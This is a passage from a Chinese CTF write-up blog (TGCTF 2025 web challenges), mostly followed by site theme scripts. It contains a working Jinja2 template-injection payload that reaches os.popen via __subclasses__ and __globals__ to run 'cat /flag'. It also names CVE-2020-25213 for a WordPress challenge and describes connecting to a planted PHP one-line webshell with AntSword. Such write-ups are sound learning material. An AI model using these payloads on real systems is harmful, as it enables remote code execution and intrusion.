+<p>template&#x3D; template.replace(&quot;直面&quot;,&quot;&#123;&#123;&quot;).replace(&quot;天命&quot;,&quot;}}&quot;)</p>
+<p>最后我们就可以构造payload了</p>
+<p>name&#x3D;直面&quot;&quot;[request.args.a1][request.args.a2][0]<a href="">request.args.a3</a>[132][request.args.a4][request.args.a5]<a href="&#39;cat+/flag&#39;">&#39;p&#39;&#39;open&#39;</a><a href="">&#39;r&#39;&#39;ead&#39;</a>天命?a1&#x3D;<strong>class</strong>&amp;a2&#x3D;<strong>bases</strong>&amp;a3&#x3D;<strong>subclasses</strong>&amp;a4&#x3D;<strong>init</strong>&amp;a5&#x3D;<strong>globals</strong></p>
+<p>TG_wordpress</p>
+<p>环境好像没了，应该是CVE-2020-25213</p>
+<p>火眼辩魑魅</p>
+<p>扫到了robots.txt</p>
+<p><img src="/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId58.png" alt="rId58.png"></p>
+<p>我们发现tgshell.php有一个一句话木马，打开蚁剑连一下下</p>
+<p><img src="/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId61.png" alt="rId61.png"></p>
+<p>连上了，里面就是flag</p>
+<p>预期解是，tgxff有个ssti在xff那里</p>
+<p><img src="/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId64.png" alt="rId64.png"></p>
+<p>这题看到好多种非预期了</p>
+<p>小结</p>
+<p>还有几道题后面再补了，有点难，后面再补了…(待续</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>TGCTF 2025 web(复现</div>
+      <div>https://xendr1a.github.io/2025/06/01/TGCTF-2025-web-复现/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Xendr1a</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/06/09/2025H-NCTF-web/" title="2025H&amp;NCTF web">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2025H&amp;NCTF web</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/21/%E8%BD%A9%E8%BE%95%E6%9D%AF-%E4%BA%91%E7%9B%BE%E7%A0%BA%E5%89%91CTF%E6%8C%91%E6%88%98%E8%B5%9B-Web/" title="“轩辕杯”云盾砺剑CTF挑战赛（Web)">
+                        <span class="hidden-mobile">“轩辕杯”云盾砺剑CTF挑战赛（Web)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
